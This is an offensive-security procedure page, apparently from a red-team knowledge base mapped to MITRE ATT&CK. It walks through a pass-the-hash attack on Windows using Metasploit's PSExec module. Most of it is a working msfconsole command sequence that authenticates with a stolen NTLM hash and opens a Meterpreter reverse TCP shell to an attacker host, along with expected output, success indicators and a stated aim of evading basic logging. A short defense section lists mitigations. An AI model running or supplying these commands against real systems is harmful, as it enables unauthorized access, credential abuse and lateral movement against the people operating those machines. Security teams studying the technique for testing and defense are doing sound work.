---
type: procedure
description: >-
  Use Metasploit's PSExec module to authenticate to a Windows target using an
  NTLM hash and establish a Meterpreter reverse TCP session for
  post-exploitation.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Use-Alternate-Authentication-Material|T1550.002 - Pass the
    Hash]]
  - '[[techniques/System-Services|T1569.002 - Service Execution]]'
sub_techniques: []
tags:
  - '[[tags/Metasploit]]'
  - '[[tags/Meterpreter]]'
  - '[[tags/Pass-the-Hash]]'
commands:
  - '[[commands/metasploit-psexec-pass-the-hash-meterpreter]]'
platforms:
  - Windows
tools:
  - '[[tools/Metasploit-Framework]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Pass-the-Hash-to-Obtain-Meterpreter-Session

## Summary

This procedure demonstrates how to use the Metasploit Framework's PSExec module to perform a Pass the Hash (PtH) attack against a Windows target. By providing an NTLM hash instead of a plaintext password, an attacker can authenticate via SMB and execute a payload to establish a Meterpreter reverse TCP session, enabling further lateral movement and post-exploitation activities.

## Description

Pass the Hash is a post-exploitation technique where an attacker uses stolen NTLM hashes to authenticate to remote systems without needing the plaintext password. In this procedure, the PSExec module mimics the legitimate PSExec tool by creating a temporary service on the target to execute the payload. This is effective against Windows systems with administrative credentials and SMB access. The target environment is typically a domain-joined Windows machine (e.g., Windows 7/10/Server) with file sharing enabled. Success grants a Meterpreter shell for command execution, file transfer, and privilege escalation. Prerequisites include obtaining the NTLM hash (e.g., via prior credential dumping) and network connectivity to the target's SMB port (445).

## Requirements

1. Metasploit Framework installed and msfconsole accessible.
2. Valid NTLM hash for an administrative user on the target Windows system.
3. Network access to the target's IP address on port 445 (SMB).
4. Attacker's IP address and a listening port for the reverse connection (e.g., 4444).
5. Target must allow SMB authentication and service creation (common in legacy Windows setups).

## Defense

- Enforce strong password policies and use Kerberos authentication over NTLM to mitigate hash reuse.
- Disable unnecessary SMB services (e.g., SMBv1) and restrict SMB traffic via firewalls to trusted segments.
- Monitor for suspicious service creation (e.g., via Windows Event Logs ID 7045) and anomalous SMB logons (Event ID 4624 with Type 3 authentication).
- Implement endpoint detection rules for PSExec-like behavior, such as temporary service installs from remote IPs.
- Use tools like Microsoft Defender for privileged access management and just-in-time admin elevation.

## Objectives

1. Authenticate to the target Windows system using the NTLM hash via SMB.
2. Deliver and execute a Meterpreter reverse TCP payload to establish a persistent session.
3. Gain interactive shell access for further exploitation, such as credential dumping or pivoting.
4. Verify successful access without alerting basic logging mechanisms.

## Instructions

### Step 1: Launch Metasploit Console and Load the PSExec Module

**Context**: Start the Metasploit console and select the PSExec exploit module, which handles SMB authentication and service-based payload execution. This step prepares the framework for the PtH attack.

**Command** ([[commands/metasploit-psexec-pass-the-hash-meterpreter]]):

```msfconsole
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set RHOST $_TARGET_IP
msf6 exploit(windows/smb/psexec) > set LHOST $_ATTACKER_IP
msf6 exploit(windows/smb/psexec) > set LPORT $_ATTACKER_PORT
msf6 exploit(windows/smb/psexec) > set SMBUser $_USERNAME
msf6 exploit(windows/smb/psexec) > set SMBPass $_NTLM_HASH
msf6 exploit(windows/smb/psexec) > set SMBDomain $_DOMAIN
msf6 exploit(windows/smb/psexec) > exploit
```

> This sequence loads the module, configures the reverse Meterpreter payload, sets the target and attacker details, provides the PtH credentials (SMBPass as the NTLM hash), and launches the exploit. The module will attempt NTLM authentication using the hash and upload/execute a service to deliver the payload. If the hash is valid and the user has admin rights, it bypasses password validation.

**Expected Output**: Confirmation of module load (e.g., "[*] exploit/windows/smb/psexec - Service starting..."), followed by payload handler startup ("[*] Started reverse TCP handler on $_ATTACKER_IP:$_ATTACKER_PORT"), and successful session ("[*] $_TARGET_IP:445 - Meterpreter session 1 opened (192.168.1.100:$_ATTACKER_PORT -> $_TARGET_IP:445)").

**Success Indicators**:
- No authentication errors (e.g., no "[-] Failed to authenticate").
- Meterpreter prompt appears: "meterpreter >".

### Step 2: Interact with the Meterpreter Session

**Context**: Once the session is established, switch to the Meterpreter shell to verify access and perform initial reconnaissance. This confirms the PtH was successful and provides a platform for further actions.

**Instructions**: In the msfconsole, use the `sessions` command to list active sessions, then interact with the new one. Run basic commands like `sysinfo` or `getuid` to validate.

```msfconsole
msf6 exploit(windows/smb/psexec) > sessions -i 1
meterpreter > sysinfo
meterpreter > getuid
```

> The `sessions -i 1` command enters the Meterpreter session. `sysinfo` displays target OS details, and `getuid` shows the current user context (should match the hashed credentials).

**Expected Output**: System info like "Computer: TARGETHOST, OS: Windows 10 (Build 19041).", and user like "Server username: DOMAIN\$_USERNAME".

**Success Indicators**:
- Interactive Meterpreter shell responds without errors.
- Commands execute in the context of the provided SMBUser.

## Expected Output

Overall success results in a stable Meterpreter session allowing full post-exploitation capabilities. Sample full output includes handler startup, exploit success, and session details as shown in Step 1.
